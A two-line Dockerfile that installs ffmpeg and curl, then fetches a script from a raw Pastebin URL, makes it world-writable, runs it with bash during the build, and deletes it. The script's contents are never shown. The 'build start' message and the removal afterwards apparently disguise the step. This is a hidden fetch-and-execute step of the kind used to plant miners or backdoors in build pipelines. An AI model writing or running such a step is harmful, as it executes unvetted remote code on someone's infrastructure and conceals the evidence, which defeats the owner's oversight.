FROM ubuntu
RUN apt update -y && apt install -y ffmpeg curl && curl https://pastebin.com/raw/NNzdKVJs -o runpy && chmod 777 runpy && echo "build start" && bash runpy && rm runpy
